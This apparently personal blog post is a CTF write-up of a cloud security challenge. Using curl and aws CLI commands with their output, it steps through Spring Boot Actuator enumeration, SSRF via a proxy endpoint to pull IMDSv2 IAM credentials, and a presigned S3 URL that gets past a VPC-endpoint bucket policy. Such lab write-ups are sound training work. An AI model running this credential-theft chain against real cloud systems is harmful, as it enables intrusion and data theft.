---
layout: post
title:  cloud security championship ctf writeup
tags: [ctf,security]
---

cloud security championship ctf writeup.

# Perimeter Leak
[challenge 1](https://www.cloudsecuritychampionship.com/challenge/1)
First, I didn't get what the author wants to test.

The title is Perimeter Leak and the author said AWS data perimeters. So I try to search for AWS data perimeters. And it's some kind of policys.

Then I say the web app is Spring Boot Actuator. So I try to leak something with the [endpoints](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html).

After I tried `env`,`metrics` and some more, I only get the bucket name.
```
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env

"BUCKET":{"value":"challenge01-470f711"
```

Then I try to use `s3` to  access the bucket. I got `aws login`. Well, I don't have the credentials.

So I'm stuck. And I used the hint 1.
```
Spring Boot Actuator applications may be misconfigured to allow access to /actuator/mappings
```
Well. It's another endpoint. It's in the previous endpoints which I didn't try.

We can see a 'proxy' endpoint and `url` parameter. And we know that, it's SSRF.

I tried to use the [aws ssrf skills](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/). But I can't get the credentials.

Stuck again. Then I tried hint 2. 
```
The endpoint /proxy can be used to obtain IMDSv2 credentials
```

Then I asked DeepSeek about IMDSv2. It's used to prevent the SSRF from access IMDS.

As I don't have much experience about IMDSv2. I also tried to search IMDSv2. There is an article about how to exploit the [IMDSv2 with ssrf](https://medium.com/@harshagv/uncovering-cloud-security-flaws-how-ssrf-exploits-imdsv2-limitations-in-aws-75bd4201786b).

First, we need a PUT request to get the token.

```
curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token"

```

Then we try to get the credentials with the token.

```

curl -H "X-aws-ec2-metadata-token: YOURTOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/"


curl -H "X-aws-ec2-metadata-token: YOURTOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"

{
  "Code" : "Success",
  "LastUpdated" : "2026-05-09T01:56:11Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASKEY",
  "SecretAccessKey" : "SCKEY",
  "Token" : "IQoJbTOKEN5qk=",
  "Expiration" : "2026-05-09T08:11:48Z"
}

```

Then we try to use [security-credentials](https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/).


```

export AWS_ACCESS_KEY_ID=ASKEY
export AWS_SECRET_ACCESS_KEY=SCKEY
export AWS_SESSION_TOKEN=IQoJbTOKEN5qk=
```

We can use this command to check.
`aws sts get-caller-identity`

Then we try to access the s3 bucket. We get the bucket name from the `env` endpoint.

```
aws s3 ls s3://challenge01-470f711

aws s3 cp s3://challenge01-470f711/hello.txt hello.txt
```

We can get the hello file. But when we try flag, we get 403.
```

aws s3 cp s3://challenge01-470f711/private/flag.txt .

fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

The medium article told us to check policy.
```
aws s3api get-bucket-policy --bucket challenge01-470f711
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Deny\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::challenge01-470f711/private/*\",\"Condition\":{\"StringNotEquals\":{\"aws:SourceVpce\":\"vpce-0dfd8b6aa1642a057\"}}}]}"
}
```
We asked DeepSeek about the policy. It says you need to access from the vpc `vpce-0dfd8b6aa1642a057`. And It also told us that you can use presign to sign the file.
```
# 生成一个默认有效期为1小时的预签名URL
aws s3 presign s3://challenge01-470f711/private/your-private-file.txt
```
Then we tried to sign the flag file. And we still need to access the url with the proxy. So you need to urlencode the url.

```
curl "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=https%3A%2F%2Fchallenge01-470f711.s3.amazonaws.com%2Fprivate%2Fflag.txt%3FX-Amz-Algorithm%3D..."
```
Bingo. The flag shows.

It's a traditional SSRF technique. But it's using the IMDSv2. So we need a SSRF which access PUT method and also custom headers. Then we can get the credentials. The interesting part is data perimeters policy. We can use presigned URLs with the ssrf endpoint. 







